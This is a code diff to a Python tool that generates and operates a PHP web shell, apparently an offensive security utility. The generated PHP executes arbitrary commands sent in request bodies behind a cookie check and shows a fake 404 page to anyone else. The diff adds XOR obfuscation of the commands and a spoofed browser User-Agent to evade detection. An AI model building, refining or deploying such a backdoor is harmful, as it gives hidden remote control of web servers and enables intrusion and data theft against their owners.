@@ -11,10 +11,11 @@ import sys
 def parse_options():
 
 	formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
-	parser = argparse.ArgumentParser(description='An Epic Web Shell - cwinfosec', formatter_class=formatter)
+	parser = argparse.ArgumentParser(description='Web Shell', formatter_class=formatter)
 	parser.add_argument("-c", "--connect", dest="connect", type=str, help="URL of web shell to connect to", required=False)
 	parser.add_argument("-k", "--key", dest="key", type=str, help="Auth key for the generated web shell", required=False)
 	parser.add_argument("-g", "--generate", dest="generate", help="Generate new key and webshell", action="store_true", required=False)
+	parser.add_argument("-pk", "--payload-key", dest="pkey", help="Payload key for webshell", required=False)
 	args = parser.parse_args()
 	return args
 
@@ -24,12 +25,14 @@ def generate_key(seed):
 	key = b64encode(bcrypt.hashpw(str(seed).encode("ascii"), salt))
 	return key.decode()
 
-def generate_shell(key):
+def generate_shell(key, gen_pkey):
 
 	shell = ['<?php',
+		'$payload_key = "%s";' % gen_pkey,
 		'if ($_COOKIE["session"] === "%s") {' % key,
-		'  $command = file_get_contents("php://input");',
-		'  echo shell_exec(base64_decode($command));',
+		'  $payload = file_get_contents("php://input");',
+		'  $command = base64_decode($payload) ^ $payload_key;',
+		'  echo shell_exec($command);',
 		'  } else {',
 		'    http_response_code(404);',
 		'    echo "<html><head>";',
@@ -50,7 +53,7 @@ def generate_shell(key):
 		file.close()
 	print(colored('[+] ', "green") + 'Created new shell.php file.')
 
-def connect(url, hmac):
+def connect(url, hmac, payload_key):
 
 	while True:
 
@@ -62,25 +65,44 @@ def connect(url, hmac):
 				os.system('clear')
 			except:
 				os.system('cls')
-		r = requests.post(url, data=b64encode(cmd.encode("ascii")), headers={'Cookie':'session=' + hmac}, verify=False)
+
+		s1 = cmd
+		s2 = payload_key
+
+		custom_headers = {
+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
+			'Cookie':'session=' + hmac,
+		}
+
+		r = requests.post(url, data=b64encode(xor_function(s1,s2).encode("ascii")), headers=custom_headers, verify=False)
 		print(r.text)
+
+def xor_function(s1, s2):
+
+	return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
 
 def main(args):
 
+
+	chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%^&*()-=_+[]{};":,./<>?'
+	seed = ''.join(random.choice(chars) for i in range(50))
+	gen_pkey = ''.join(random.choice(chars) for i in range(8))
+
 	if args.connect:
 
+		payload_key = args.pkey
 		url = args.connect
 		hmac = args.key
-		connect(url, hmac)
+		print(colored('[+] ', "blue") + 'Connecting to %s\nUsing HMAC: %s\nUsing Payload Key: %s\n' % (url,hmac,payload_key))
+		connect(url, hmac, payload_key)
 
 	if args.generate:
 
-		chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%^&*()-=_+[]{};":,./<>?'
-		seed = ''.join(random.choice(chars) for i in range(50))
 		print(colored('[+] ', 'blue') + 'Seed: ' + seed)
+		print(colored('[+] ', 'blue') + 'Payload Key: ' + gen_pkey)
 		key = generate_key(seed)
 		print(colored('[+] ', 'blue') + 'Key: %s' % key)
-		generate_shell(key)
+		generate_shell(key, gen_pkey)
 
 if __name__ in "__main__":
 
